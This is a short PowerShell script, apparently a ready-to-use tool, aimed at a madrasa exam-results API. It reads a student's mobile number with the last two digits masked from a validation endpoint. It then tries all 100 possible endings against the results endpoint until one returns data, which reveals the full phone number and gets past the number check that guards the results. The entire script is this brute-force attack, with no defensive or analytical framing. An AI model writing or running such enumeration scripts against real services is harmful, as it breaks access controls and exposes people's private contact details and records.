# wifaq.ps1
# PowerShell script to find full mobile number from API

# Clear screen
Clear-Host

Write-Host "====================================="
Write-Host "   Madrasha Result Finder"
Write-Host "====================================="
Write-Host ""

# Prompt user for input
$melhaq = Read-Host "Enter melhaq (e.g. g-1/1473)"
$class = Read-Host "Enter class (e.g. 5)"
$years = Read-Host "Enter year (e.g. 2025)"

Write-Host ""
Write-Host "🔎 Getting masked mobile number..."
Write-Host ""

# Step 1: Get masked mobile prefix
try {
    $validationResponse = Invoke-RestMethod "https://api.wifaqresult.com/api/madrasha-validation?melhaq=$melhaq&class=$class&years=$years"
} catch {
    Write-Host "❌ Failed to reach validation API" -ForegroundColor Red
    exit
}

if ($validationResponse.data -match '([0-9]{9})XX') {
    $mobilePrefix = $matches[1]
    Write-Host "📱 Mobile prefix found: $mobilePrefix"XX
} else {
    Write-Host "❌ Failed to get mobile prefix" -ForegroundColor Red
    exit
}

Write-Host "🔁 Trying last 2 digits..."
Write-Host ""

# Step 2: Loop last 2 digits
for ($i=0; $i -le 99; $i++) {
    $suffix = "{0:D2}" -f $i
    $mobile = "$mobilePrefix$suffix"
    Write-Host "Trying $mobile ..."

    try {
        $response = Invoke-RestMethod "https://api.wifaqresult.com/api/madrasha-result?melhaq=$melhaq&class=$class&mobile=$mobile&years=$years"
    } catch {
        Write-Host "⚠️ Error accessing API" -ForegroundColor Yellow
        continue
    }

    # Step 3: Check if data exists
    if ($response.data -ne $null -and $response.data.Count -gt 0) {
        Write-Host ""
        Write-Host "✅ SUCCESS!" -ForegroundColor Green
        Write-Host "📱 Mobile: $mobile"
        break
    }
}

Write-Host ""
Write-Host "Done."
